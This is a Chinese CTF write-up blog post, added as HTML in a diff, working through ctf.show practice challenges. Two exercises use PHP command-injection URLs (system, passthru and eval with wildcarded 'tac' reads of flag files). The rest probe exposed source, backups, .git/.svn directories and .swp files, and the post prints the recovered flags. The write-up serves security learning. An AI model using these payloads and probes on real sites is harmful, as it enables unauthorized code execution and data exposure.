@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>17.1-练习 | lanceplm</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+ 
+  
+    <link rel="icon" href="/../img/icon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle"></a>
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives">归档</a>
+        
+          <a class="main-nav-link" href="/about">关于</a>
+        
+          <a class="main-nav-link" href="/board">留言</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-17.1-练习" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="name">
+      17.1-练习
+    </h1>
+  
+
+        <div class="article-meta">
+          <a href="/2024/01/19/17.1-%E7%BB%83%E4%B9%A0/" class="article-date">
+  <time datetime="2024-01-19T08:02:27.854Z" itemprop="datePublished">2024-01-19</time>
+</a>
+          
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><p>先ls查看文件夹中有哪些内容</p>
+<p>查看flag内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9bd3ef70-539a-4e45-9d1d-6f3f080459fb.challenge.ctf.show/?c=system(&quot;tac ????.php&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/1111.png" alt="1111"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag = &#x27;ctfshow&#123;269ffc5c-0a0d-42f0-9a3d-61f44c91d008&#125;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5><p>先查看文件夹里有哪些文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://86e99148-260b-4a6d-b942-b685310c249e.challenge.ctf.show/?c=passthru(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119160857721.png" alt="image-20240119160857721"></p>
+<p>查看flag内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://86e99148-260b-4a6d-b942-b685310c249e.challenge.ctf.show/?c=passthru(&quot;tac fla?.?hp&quot;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://86e99148-260b-4a6d-b942-b685310c249e.challenge.ctf.show/?c=eval($_GET[a]);&amp;a=system(&#x27;tac fla?.p?p&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119160344212.png" alt="image-20240119160344212"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$flag = &#x27;ctfshow&#123;c8e2271c-b9f1-48a1-b8e9-350a967c234e&#125;&#x27;; </span><br></pre></td></tr></table></figure>
+
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><h5 id="3"><a href="#3" class="headerlink" title="3"></a>3</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a8ade1f1-5f36-450e-989b-ad02d6ef4c30.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119162720174.png" alt="image-20240119162720174"></p>
+<p>查看页面源代码</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119162736058.png" alt="image-20240119162736058"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;b8ac55d2-36d9-4efc-a0b3-f24710c94400&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="4"><a href="#4" class="headerlink" title="4"></a>4</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://4d87afbd-0a49-4b58-9ec9-025f840c0ee9.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p>先去别的网址开F12</p>
+<p>在进入这个网址</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119163035582.png" alt="image-20240119163035582"></p>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://4d87afbd-0a49-4b58-9ec9-025f840c0ee9.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://50fc176d-58bd-450e-9e85-2dc8c9088520.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119163138233.png" alt="image-20240119163138233"></p>
+<p>F12</p>
+<p>网络</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119163337972.png" alt="image-20240119163337972"></p>
+<h5 id="6"><a href="#6" class="headerlink" title="6"></a>6</h5><p>扫目录扫出一个&#x2F;robots.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2c7cd478-25bb-4c2c-aef3-715f717ec137.challenge.ctf.show/robots.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119163807705.png" alt="image-20240119163807705"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2c7cd478-25bb-4c2c-aef3-715f717ec137.challenge.ctf.show/flagishere.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119163824014.png" alt="image-20240119163824014"></p>
+<h5 id="7"><a href="#7" class="headerlink" title="7"></a>7</h5><p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119164652092.png" alt="image-20240119164652092"></p>
+<p>访问index.phps</p>
+<p>下载源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://793b778d-7cd3-422b-abbd-f3f660650d41.challenge.ctf.show/index.phps</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119164732985.png" alt="image-20240119164732985"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119164751466.png" alt="image-20240119164751466"></p>
+<h5 id="8"><a href="#8" class="headerlink" title="8"></a>8</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://188308af-5a83-49ac-923c-0b13f60daf4e.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p>扫目录</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119165029916.png" alt="image-20240119165029916"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://188308af-5a83-49ac-923c-0b13f60daf4e.challenge.ctf.show/www.zip</span><br></pre></td></tr></table></figure>
+
+<p>自动下载<img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119165138763.png" alt="image-20240119165138763">件</p>
+<p>解压得到</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119165206323.png" alt="image-20240119165206323"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119165218976.png" alt="image-20240119165218976"></p>
+<h5 id="9"><a href="#9" class="headerlink" title="9"></a>9</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fde72cb9-f23e-450e-99e6-8b2fa58ea664.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119165312081.png" alt="image-20240119165312081"></p>
+<p>扫目录</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119165540610.png" alt="image-20240119165540610"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fde72cb9-f23e-450e-99e6-8b2fa58ea664.challenge.ctf.show/.git</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119165612358.png" alt="image-20240119165612358"></p>
+<h5 id="10"><a href="#10" class="headerlink" title="10"></a>10</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://eadb6707-1433-49d1-a1a2-112724cddb99.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119170134593.png" alt="image-20240119170134593"></p>
+<p>扫目录</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119170222712.png" alt="image-20240119170222712"></p>
+<p><a target="_blank" rel="noopener" href="http://eadb6707-1433-49d1-a1a2-112724cddb99.challenge.ctf.show/.svn/">http://eadb6707-1433-49d1-a1a2-112724cddb99.challenge.ctf.show/.svn/</a></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119170244313.png" alt="image-20240119170244313"></p>
+<h5 id="11"><a href="#11" class="headerlink" title="11"></a>11</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7e30f0a5-b1aa-41e9-a095-643b0ef1c4f0.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119170359881.png" alt="image-20240119170359881"></p>
+<p>访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7e30f0a5-b1aa-41e9-a095-643b0ef1c4f0.challenge.ctf.show/index.php.swp</span><br></pre></td></tr></table></figure>
+
+<p>下载缓存文件</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119170619405.png" alt="image-20240119170619405"></p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119170651840.png" alt="image-20240119170651840"></p>
+<h5 id="12"><a href="#12" class="headerlink" title="12"></a>12</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9573ddd7-ee09-45d5-b758-c9156d5ab4df.challenge.ctf.show/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119172354735.png" alt="image-20240119172354735"></p>
+<p>F12打开，发现一个js&#x2F;Flappy_js.js文件</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119172732453.png" alt="image-20240119172732453"></p>
+<p>点击查看</p>
+<p>发现结果</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119172809155.png" alt="image-20240119172809155"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b</span><br></pre></td></tr></table></figure>
+
+<p>解码它</p>
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119173038395.png" alt="image-20240119173038395"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你赢了，去幺幺零点皮爱吃皮看看</span><br></pre></td></tr></table></figure>
+
+<p>访问110.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://9573ddd7-ee09-45d5-b758-c9156d5ab4df.challenge.ctf.show/110.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/lanceplm/wanganpic/main/img/image-20240119171559972.png" alt="image-20240119171559972"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;47acb5bd-4315-4ebf-8052-0f694034f8cc&#125; </span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+  </div>
+ 
+</article>
+
+
+  
+    <section id="comments" class="comments">
+      <style>
+        .comments{margin:30px;padding:10px;background:#fff}
+        @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+      </style>
+      <div id="vcomment" class="comment"></div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+    var notify = 'true' == true ? true : false;
+    var verify = 'false' == true ? true : false;
+    new Valine({
+        av: AV,
+        el: '#vcomment',
+        notify: notify,
+        app_id: "HBismw2vU6hg56PslAF2APW1-gzGzoHsz",
+        app_key: "k41e2BJYdNbojyHuMnKT5LBK",
+        placeholder: "留下你来过的痕迹~",
+        avatar:"robohash",
+    });
+</script>
+
+  </section>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+    <div class="widget-wrap-info">
+        <img src="/../img/avator.jpg" class="widget-wrap-info-img">
+        <div class="widget-wrap-info-author">lanceplm</div>
+        <div class="widget-wrap-info-signature">随遇而安。</div>
+    </div>
+    <div class="info-nav">
+        <ul class="info-nav-ul">
+        
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="home"></i>
+                    </span>
+                    <span class="info-nav-name">首页</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/archives">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="archive"></i>
+                    </span>
+                    <span class="info-nav-name">归档</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/about">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="alert-circle"></i>
+                    </span>
+                    <span class="info-nav-name">关于</span>
+                </div>
+            </a>
+           </li>
+          
+            <li class="info-nav-li">
+            <a class="info-nav-link" href="/board">
+                <div class="info-nav-div">
+                    <span class="info-nav-icon">
+                        <i data-feather="edit-3"></i>
+                    </span>
+                    <span class="info-nav-name">留言</span>
+                </div>
+            </a>
+           </li>
+          
+        </ul>
+    </div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2024 lanceplm<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by  <a href="https://github.com/FuShaoLei/hexo-theme-hiya" target="_blank">Hiya</a>
+      
+        <br>
+        <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+      <span id="busuanzi_container_site_uv">
+        访客数<span id="busuanzi_value_site_uv"></span>人次
+      </span>
+        
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/,home" class="mobile-nav-link">首页</a>
+  
+    <a href="/archives,archive" class="mobile-nav-link">归档</a>
+  
+    <a href="/about,alert-circle" class="mobile-nav-link">关于</a>
+  
+    <a href="/board,edit-3" class="mobile-nav-link">留言</a>
+  
+</nav>
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script>
+    feather.replace()
+</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
